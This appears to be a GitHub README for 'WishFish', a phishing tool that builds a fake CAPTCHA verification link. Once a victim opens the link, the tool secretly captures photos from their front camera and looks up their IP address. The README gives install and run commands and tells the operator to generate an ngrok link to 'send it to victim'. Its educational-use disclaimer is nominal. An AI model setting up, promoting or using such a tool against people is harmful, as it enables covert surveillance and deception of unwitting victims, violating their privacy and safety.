![alt text](https://github.com/Neutrino-Tech/Wishfish-Robot/blob/main/wishfish.png)
![alt text](https://github.com/Neutrino-Tech/Wishfish-Robot/blob/main/wishfish-robot.png)

<h1>WishFish v3.0</h1>
                                                   
<p>Using WishFish tool you can generate E-CAPTCHA robot verification link can grab victim front camera pictures and also gives you lockup information of target ip address.
<p1>

<h3>Installation on Debian</h3>

```bash
sudo apt install php wget openssh
git clone https://github.com/Neutrino-Tech/Wishfish-Robot.git
```

<h3>Installation on Arch</h3>

```bash
sudo pacman -S php wget openssh
sudo yay -S php wget openssh
git clone https://github.com/Neutrino-Tech/Wishfish-Robot.git
```

<h3>Installation on Fedora</h3>

```bash
sudo dnf install php wget openssh
git clone https://github.com/Neutrino-Tech/Wishfish-Robot.git
```

<h3>Usage</h3>

```bash
cd Wishfish-Pacman
sudo chmod +x wishfish.sh
bash wishfish.sh or ./wishfish.sh
```

<h4>Note :- Sometimes servero server is down so always go with ngrok for instant link and wait until it generates url for then send it to victim. 
    If victim open this url in chrome or android inbuilt browser then it can access victim camera by allowing permissions and send snap to you.
</h4>

>The captured images will be stored in captured folder. Run the following script to copy it to pictures folder

```bash
chmod +x copy.sh && ./copy.sh
```

This information is only for educationla purpose and we are not responsible for any kind of illegal activity done by this tool.


                                    Inspired By github.com/kinghacker0/WishPhish
